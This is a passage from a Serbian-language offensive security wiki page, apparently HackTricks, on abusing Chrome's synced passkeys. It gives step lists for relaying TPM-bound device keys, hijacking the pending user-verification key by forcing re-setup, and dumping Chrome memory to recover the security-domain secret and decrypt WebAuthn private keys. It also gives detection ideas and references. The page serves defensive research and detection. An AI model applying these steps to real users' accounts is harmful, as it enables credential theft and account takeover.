NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

To znači da **vezivanje za hardver sprečava izvoz van uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanom krajnjem uređaju**.

### Praktični načini zloupotrebe

1. **Pass-ta-key / relay identiteta uređaja**<sup>[[4]](#references)</sup>
   - Popišite `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
   - Započnite prijavu pomoću passkey-ja i pribavite svež WebAuthn izazov.
   - Upotrebite ukradeni blob `wrapped_identity_private_key` na žrtvinom TPM-u za potpisivanje zahteva cloud-authenticator-a.
   - Prosledite vrađenu potvrdu relying party-ju.
   - Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje potvrde sa **`UV=0`**.
2. **Otmica ključa na čekanju za UV**<sup>[[4]](#references)</sup>
   - Prisilite ponovno podešavanje tako što ćete obrisati `passkey_enclave_state` ili poslati važeću potpisanu operaciju `device/forget`.
   - Ako se nakon podešavanja uređaj nađe u stanju **`uv_key_pending`**, registrujte UV javni ključ koji kontroliše napadač.
   - Ako dobavljač ne proverava atestaciju / poreklo iz bezbednog hardvera za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
3. **Krađa glavne tajne / oporavka SDS-a**<sup>[[4]](#references)</sup>
   - Prisilite oporavak ili ponovno pridruživanje kako bi Chrome preuzeo glavnu tajnu sinhronizovanih passkey-ja.
   - Pratite ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim napravite ispis Chrome memorije dok je otvoreni tekst **tajne bezbednosnog domena (SDS)** prisutan u memoriji.
   - Upotrebite oporavljeni SDS za dešifrovanje šifrovanih polja u svakom zapisu `WebauthnCredentialSpecifics` i oporavite prenosive WebAuthn privatne ključeve.

### Ideje za DFIR / detekciju

- Pratite **brisanje/ponovno kreiranje** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozoravajte na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** od strane procesa koji nisu pregledač.
- Upozoravajte na **ispise Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Istražite ponovljene zahteve za **Google Password Manager PIN za oporavak** ili neočekivano ponovno podešavanje.
- Imajte na umu da WebAuthn **`signCount`** često nije koristan za sinhronizovane passkey-je jer može ostati nepromenjen, pa je klasično otkrivanje kloniranja slabo.

## References

- [1] [Unit 42 – Istraga o godinama neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Iza Ink Dragon-a: otkrivanje relejne mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nova površina za napad u autentifikaciji bez lozinke](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / skladištenje ključeva CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hakovanje Windows-a: napadi na Microsoft sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory skladište podataka zaista funkcioniše: uvid u NTDS.dit (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Daljinski ispis lozinki iz Lsass-a](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj arsenal sajber-špijunaže pomoću Still kompleta alata](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcija CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy režim pravljenja rezervne kopije `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – prekid aktivnih sesija](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard i Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: zaštita i upravljanje akreditivima](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
